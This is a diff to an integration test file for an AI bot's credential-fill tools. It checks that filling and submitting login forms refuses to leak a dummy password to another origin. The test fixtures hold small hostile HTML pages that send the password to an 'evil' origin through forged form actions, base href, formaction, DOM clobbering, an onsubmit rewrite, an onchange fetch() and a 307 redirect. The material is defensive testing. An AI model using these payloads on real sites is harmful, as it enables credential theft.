@@ -13,6 +13,7 @@ import { fileURLToPath } from "node:url";
 
 import { Credentials } from "../desktop/link/credentials.mjs";
 import { CredentialGrants } from "../desktop/credential-grants.mjs";
+import { ScreenBrowser } from "../desktop/host/form-browser.mjs";
 import { SecureInputs, performSecureUse } from "../desktop/secure-input.mjs";
 import { BrowserController } from "../../extension/src/browser-controller.mjs";
 
@@ -67,11 +68,37 @@ function generateSelfSignedCert(dir) {
   };
 }
 
-async function startHttpsFixtureServer(tls, { redirectTarget = null, crossOriginFrameUrl = null } = {}) {
+async function startHttpsFixtureServer(tls, { redirectTarget = null, crossOriginFrameUrl = null, evilOrigin = null, onSubmit = null, onEvilRequest = null } = {}) {
   const server = https.createServer(tls, (req, res) => {
     const cleanPath = (req.url || "/").split("?")[0];
+    if (onEvilRequest) {
+      let body = "";
+      req.on("data", (chunk) => { body += chunk; });
+      req.on("end", () => {
+        onEvilRequest({ method: req.method, url: req.url, body });
+        res.writeHead(200, { "Content-Type": "text/plain" });
+        res.end("recorded");
+      });
+      return;
+    }
     if (cleanPath === "/redirect" && redirectTarget) {
       res.writeHead(302, { Location: redirectTarget });
+      res.end();
+      return;
+    }
+    if (cleanPath === "/submit-ok" && req.method === "POST") {
+      let body = "";
+      req.on("data", (chunk) => { body += chunk; });
+      req.on("end", () => {
+        onSubmit?.({ path: cleanPath, body });
+        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
+        res.end("<!doctype html><html><body><h1>Signed In</h1></body></html>");
+      });
+      return;
+    }
+    if (cleanPath === "/submit-redirect-evil" && req.method === "POST" && evilOrigin) {
+      req.resume();
+      res.writeHead(307, { Location: `${evilOrigin}/steal-redirect` });
       res.end();
       return;
     }
@@ -82,6 +109,77 @@ async function startHttpsFixtureServer(tls, { redirectTarget = null, crossOrigin
         <iframe id="evil-xorigin" src="${crossOriginFrameUrl}"></iframe>
       </body></html>`);
       return;
+    }
+    if (evilOrigin) {
+      const synthetic = {
+        "/page-ok": `<!doctype html><html><body>
+          <form id="login" method="post" action="/submit-ok">
+            <input id="email" name="email" type="email">
+            <input id="password" name="password" type="password">
+            <button id="submit-btn" type="submit">Sign In</button>
+          </form>
+        </body></html>`,
+        "/page-evil-action": `<!doctype html><html><body>
+          <form id="login" method="post" action="${evilOrigin}/steal-action">
+            <input id="password" name="password" type="password">
+            <button id="submit-btn" type="submit">Sign In</button>
+          </form>
+        </body></html>`,
+        "/page-http-downgrade": `<!doctype html><html><body>
+          <form id="login" method="post" action="http://127.0.0.1:9/downgrade">
+            <input id="password" name="password" type="password">
+            <button id="submit-btn" type="submit">Sign In</button>
+          </form>
+        </body></html>`,
+        "/page-evil-base": `<!doctype html><html><head><base href="${evilOrigin}/"></head><body>
+          <form id="login" method="post" action="steal-base">
+            <input id="password" name="password" type="password">
+            <button id="submit-btn" type="submit">Sign In</button>
+          </form>
+        </body></html>`,
+        "/page-evil-formaction": `<!doctype html><html><body>
+          <form id="login" method="post" action="/submit-ok">
+            <input id="password" name="password" type="password">
+            <button id="submit-btn" type="submit" formaction="${evilOrigin}/steal-formaction">Sign In</button>
+          </form>
+        </body></html>`,
+        "/page-evil-external-submitter": `<!doctype html><html><body>
+          <form id="login" method="post" action="/submit-ok">
+            <input id="password" name="password" type="password">
+          </form>
+          <button id="ext-btn" type="submit" form="login" formaction="${evilOrigin}/steal-ext">External</button>
+        </body></html>`,
+        "/page-clobbered": `<!doctype html><html><body>
+          <form id="login" method="post" action="${evilOrigin}/steal-clobber">
+            <input name="action" value="/submit-ok">
+            <input id="password" name="password" type="password">
+            <button id="submit-btn" type="submit">Sign In</button>
+          </form>
+        </body></html>`,
+        "/page-js-rewrite": `<!doctype html><html><body>
+          <form id="login" method="post" action="/submit-ok" onsubmit="this.action='${evilOrigin}/steal-js-rewrite'">
+            <input id="password" name="password" type="password">
+            <button id="submit-btn" type="submit">Sign In</button>
+          </form>
+        </body></html>`,
+        "/page-js-fetch": `<!doctype html><html><body>
+          <form id="login" method="post" action="/submit-ok">
+            <input id="password" name="password" type="password" onchange="fetch('${evilOrigin}/steal-fetch', {method:'POST', mode:'no-cors', body:this.value})">
+            <button id="submit-btn" type="submit">Sign In</button>
+          </form>
+        </body></html>`,
+        "/page-307-redirect": `<!doctype html><html><body>
+          <form id="login" method="post" action="/submit-redirect-evil">
+            <input id="password" name="password" type="password">
+            <button id="submit-btn" type="submit">Sign In</button>
+          </form>
+        </body></html>`,
+      };
+      if (Object.hasOwn(synthetic, cleanPath)) {
+        res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
+        res.end(synthetic[cleanPath]);
+        return;
+      }
     }
     const rel = cleanPath === "/" ? "login-with-foreign-extension.html" : cleanPath.replace(/^\/+/, "");
     const filePath = join(fixturesDir, rel);
@@ -262,7 +360,7 @@ async function launchChromium(chromeBin) {
 const chromeBin = findChromiumBinary();
 
 test(
-  "HTTPS login integration: Ask -> approve fill+submit, Always allow -> no card, redirect & different origin refused, TOTP in same-origin iframe",
+  "HTTPS extension_fill integration: auto-submit disabled, Ask -> approve fill-only, Always allow -> no card, off-origin action/base/formaction/redirect refused, TOTP in same-origin iframe",
   { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
   async (t) => {
     if (!existsSync(driverBundlePath)) {
@@ -279,9 +377,12 @@ test(
     const trustedServer = await startHttpsFixtureServer(tls, {
       redirectTarget: `${evilServer.origin}/`,
       crossOriginFrameUrl: `${evilServer.origin}/subframe.html`,
+      evilOrigin: evilServer.origin,
     });
     t.after(() => {
+      trustedServer.server.closeAllConnections?.();
       trustedServer.server.close();
+      evilServer.server.closeAllConnections?.();
       evilServer.server.close();
     });
 
@@ -457,7 +558,24 @@ test(
     // 1. Navigate to the local HTTPS login page (with foreign chrome-extension:// iframe!)
     await navigateAndBind(`${trustedServer.origin}/`);
 
-    // 2. Fill & submit under default Ask (card raised & approved once)
+    // 1b. extension_fill with submit fails closed (auto-submit is disabled in MV3 extension)
+    await assert.rejects(
+      () => tools.get("use_credential")({
+        credentialId: credId,
+        operation: "extension_fill",
+        destination: `${trustedServer.origin}/`,
+        fields: [
+          { selector: "#email", source: "username" },
+          { selector: "#password", source: "value" },
+        ],
+        submit: { selector: "#submit-btn" },
+      }),
+      /auto-submit is disabled/i,
+    );
+    assert.equal(cards.length, 0, "Auto-submit refusal must fail closed before prompting");
+    assert.notEqual(await browser.cdp.eval(`document.querySelector('#password').value`), secretPassword);
+
+    // 2. Fill-only under default Ask (card raised & approved once; never auto-submits)
     nextCardAction = "approve";
     const fillRes1 = JSON.parse(await tools.get("use_credential")({
       credentialId: credId,
@@ -467,25 +585,23 @@ test(
         { selector: "#email", source: "username" },
         { selector: "#password", source: "value" },
       ],
-      submit: { selector: "#submit-btn" },
     }));
     assert.equal(cards.length, 1, "First use under Ask must raise an approval card");
     assert.equal(fillRes1.applied, true);
-    assert.equal(fillRes1.submitted, true);
+    assert.equal(fillRes1.submitted, false, "extension_fill must never auto-submit");
     assert.ok(!JSON.stringify(fillRes1).includes(secretPassword), "Secret must never appear in tool output");
 
-    // Verify React state + DOM value + form submit event actually happened on the real HTTPS page!
+    // Verify React state + DOM value filled cleanly on the real HTTPS page without auto-submitting!
     const pageCheck1 = await browser.cdp.eval(`({
       email: document.querySelector('#email').value,
       reactEmail: window.__reactInputState?.email,
       passwordMatches: document.querySelector('#password').value === ${JSON.stringify(secretPassword)},
-      submitted: window.__submits?.[0] ?? null,
+      submits: window.__submits?.length ?? 0,
     })`);
     assert.equal(pageCheck1.email, "colt@scissorsscotch.com");
     assert.equal(pageCheck1.reactEmail, "colt@scissorsscotch.com");
     assert.equal(pageCheck1.passwordMatches, true);
-    assert.ok(pageCheck1.submitted && pageCheck1.submitted.email === "colt@scissorsscotch.com");
-    assert.equal(pageCheck1.submitted.passwordLength, secretPassword.length);
+    assert.equal(pageCheck1.submits, 0);
 
     // Verify a bot snapshot of the page NEVER reads the filled password back!
     const snap = await controller.run("browser_snapshot", { tabId });
@@ -502,10 +618,10 @@ test(
         { selector: "#email", source: "username" },
         { selector: "#password", source: "value" },
       ],
-      submit: { selector: "#submit-btn" },
     }));
     assert.equal(cards.length, 2);
     assert.equal(fillRes2.applied, true);
+    assert.equal(fillRes2.submitted, false);
     assert.equal(fillRes2.grantLevel, "always");
 
     // Reload and invoke again — must run immediately with ZERO new approval card!
@@ -518,10 +634,10 @@ test(
         { selector: "#email", source: "username" },
         { selector: "#password", source: "value" },
       ],
-      submit: { selector: "#submit-btn" },
     }));
     assert.equal(cards.length, 2, "Standing Always-allow grant must fill without raising another card");
     assert.equal(fillRes3.applied, true);
+    assert.equal(fillRes3.submitted, false);
     assert.equal(fillRes3.grantLevel, "always");
 
     const pageCheck3 = await browser.cdp.eval(`({
@@ -529,7 +645,43 @@ test(
       submitted: (window.__submits?.length ?? 0) > 0,
     })`);
     assert.equal(pageCheck3.passwordMatches, true);
-    assert.equal(pageCheck3.submitted, true);
+    assert.equal(pageCheck3.submitted, false);
+
+    // 3b. Even under an Always-allow grant on trustedServer.origin, off-origin submit destinations
+    // (<form action>, HTTP downgrade, <base href>, <button formaction>, external submitter, DOM clobbering)
+    // MUST fail closed BEFORE writing any value!
+    // Use a dedicated botId so the per-bot rate limiter (10/min) is not exhausted across the full scenario.
+    grants.setGrant({
+      credentialId: credId,
+      botId: "bot-bad-paths",
+      operation: "extension_fill",
+      destination: trustedServer.origin,
+      level: "always",
+    });
+    const badPathTools = new Map(
+      secureInputs.tools({ id: "bot-bad-paths", name: "BadPathBot" }, chat, run, task).map((tool) => [tool.name, tool.handler]),
+    );
+    for (const badPath of [
+      "/page-evil-action",
+      "/page-http-downgrade",
+      "/page-evil-base",
+      "/page-evil-formaction",
+      "/page-evil-external-submitter",
+      "/page-clobbered",
+    ]) {
+      await navigateAndBind(`${trustedServer.origin}${badPath}`);
+      await assert.rejects(
+        () => badPathTools.get("use_credential")({
+          credentialId: credId,
+          operation: "extension_fill",
+          destination: `${trustedServer.origin}${badPath}`,
+          fields: [{ selector: "#password", source: "value" }],
+        }),
+        /origin mismatch|submit destination|https/i,
+      );
+      const pw = await browser.cdp.eval(`document.querySelector('#password')?.value ?? ''`);
+      assert.equal(pw, "", `${badPath} must fail closed before writing dummy secret`);
+    }
 
     // 4. Malicious redirect attack: page navigated to /redirect -> evilServer.origin!
     // Even though the bot has a standing Always-allow grant for trustedServer.origin,
@@ -624,3 +776,168 @@ test(
     );
   },
 );
+
+test(
+  "HTTPS ScreenBrowser integration (page_fill / page_fill_submit): enforces approved origin at DOM and CDP Fetch network boundary",
+  { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
+  async (t) => {
+    const workDir = mkdtempSync(join(tmpdir(), "botkins-screenbrowser-https-"));
+    t.after(() => rmSync(workDir, { recursive: true, force: true }));
+
+    const tls = generateSelfSignedCert(workDir);
+    const evilRequests = [];
+    const okSubmits = [];
+    const evilServer = await startHttpsFixtureServer(tls, {
+      onEvilRequest: (req) => evilRequests.push(req),
+    });
+    const trustedServer = await startHttpsFixtureServer(tls, {
+      evilOrigin: evilServer.origin,
+      onSubmit: (sub) => okSubmits.push(sub),
+    });
+    t.after(() => {
+      trustedServer.server.closeAllConnections?.();
+      trustedServer.server.close();
+      evilServer.server.closeAllConnections?.();
+      evilServer.server.close();
+    });
+
+    const browser = new ScreenBrowser({
+      executable: chromeBin,
+      args: ["--headless=new", "--no-sandbox", "--ignore-certificate-errors"],
+      env: { ...process.env, DISPLAY: process.env.DISPLAY || ":99" },
+    });
+    t.after(() => browser.stop());
+
+    const chatId = "chat-screenbrowser-https";
+    const dummySecret = "dummy-screenbrowser-secret-only";
+    const dummyEmail = "dummy@example.test";
+
+    // 1. ALLOW: same-origin HTTPS form fill + submit delivers dummy secret ONLY to trustedServer
+    const okUrl = `${trustedServer.origin}/page-ok`;
+    await browser.open(chatId, okUrl);
+    const okDoc = await browser.bind(chatId, okUrl);
+    await browser.fill(
+      {
+        chatId,
+        url: okUrl,
+        document: okDoc,
+        fields: [{ key: "email" }, { key: "password" }],
+        submit: { selector: "#submit-btn" },
+      },
+      { email: dummyEmail, password: dummySecret },
+      AbortSignal.timeout(10_000),
+    );
+    await new Promise((r) => setTimeout(r, 400));
+    assert.equal(okSubmits.length, 1, "Same-origin HTTPS submit must succeed");
+    assert.ok(okSubmits[0].body.includes(dummySecret), "Trusted origin received dummy form payload");
+    assert.equal(evilRequests.length, 0, "Evil origin must receive zero requests");
+
+    // 2. DENY BEFORE FILLING: off-origin <form action>, HTTP downgrade, <base href>,
+    // <button formaction>, external submitter, and DOM-clobbered <input name="action">
+    for (const badPath of [
+      "/page-evil-action",
+      "/page-http-downgrade",
+      "/page-evil-base",
+      "/page-evil-formaction",
+      "/page-evil-external-submitter",
+      "/page-clobbered",
+    ]) {
+      const url = `${trustedServer.origin}${badPath}`;
+      await browser.open(chatId, url);
+      const doc = await browser.bind(chatId, url);
+      const submitTarget = badPath === "/page-evil-external-submitter"
+        ? { selector: "#ext-btn" }
+        : { selector: "#submit-btn" };
+      await assert.rejects(
+        () => browser.fill(
+          {
+            chatId,
+            url,
+            document: doc,
+            fields: [{ key: "password" }],
+            submit: submitTarget,
+          },
+          { password: dummySecret },
+          AbortSignal.timeout(10_000),
+        ),
+        /approved origin|submit destination|https/i,
+        `${badPath} must fail closed before filling`,
+      );
+      await new Promise((r) => setTimeout(r, 150));
+      assert.equal(evilRequests.length, 0, `${badPath} must never reach evil origin`);
+    }
+
+    // 3. DENY AT BROWSER NETWORK BOUNDARY (CDP Fetch.enable):
+    // 3a. JS onsubmit handler rewrites form.action to evilServer right at submit time
+    {
+      const url = `${trustedServer.origin}/page-js-rewrite`;
+      await browser.open(chatId, url);
+      const doc = await browser.bind(chatId, url);
+      await assert.rejects(
+        () => browser.fill(
+          {
+            chatId,
+            url,
+            document: doc,
+            fields: [{ key: "password" }],
+            submit: { selector: "#submit-btn" },
+          },
+          { password: dummySecret },
+          AbortSignal.timeout(10_000),
+        ),
+        /browser boundary|approved https origin/i,
+        "CDP Fetch boundary guard must catch and report JS onsubmit cross-origin rewrite",
+      );
+      await new Promise((r) => setTimeout(r, 300));
+      assert.equal(evilRequests.length, 0, "CDP Fetch boundary guard must block JS onsubmit cross-origin action rewrite");
+    }
+
+    // 3b. JS onchange handler tries to fetch() the filled value to evilServer
+    {
+      const url = `${trustedServer.origin}/page-js-fetch`;
+      await browser.open(chatId, url);
+      const doc = await browser.bind(chatId, url);
+      try {
+        await browser.fill(
+          {
+            chatId,
+            url,
+            document: doc,
+            fields: [{ key: "password" }],
+          },
+          { password: dummySecret },
+          AbortSignal.timeout(10_000),
+        );
+      } catch (err) {
+        assert.match(String(err?.message || err), /browser boundary|approved https origin/i);
+      }
+      await new Promise((r) => setTimeout(r, 300));
+      assert.equal(evilRequests.length, 0, "CDP Fetch boundary guard must block JS onchange cross-origin fetch");
+    }
+
+    // 3c. Same-origin POST returns 307 redirect to evilServer
+    {
+      const url = `${trustedServer.origin}/page-307-redirect`;
+      await browser.open(chatId, url);
+      const doc = await browser.bind(chatId, url);
+      await assert.rejects(
+        () => browser.fill(
+          {
+            chatId,
+            url,
+            document: doc,
+            fields: [{ key: "password" }],
+            submit: { selector: "#submit-btn" },
+          },
+          { password: dummySecret },
+          AbortSignal.timeout(10_000),
+        ),
+        /browser boundary|approved https origin/i,
+        "CDP Fetch boundary guard must catch and block 307 cross-origin redirect",
+      );
+      await new Promise((r) => setTimeout(r, 300));
+      assert.equal(evilRequests.length, 0, "CDP Fetch boundary guard must block 307 cross-origin redirect");
+    }
+  },
+);
+
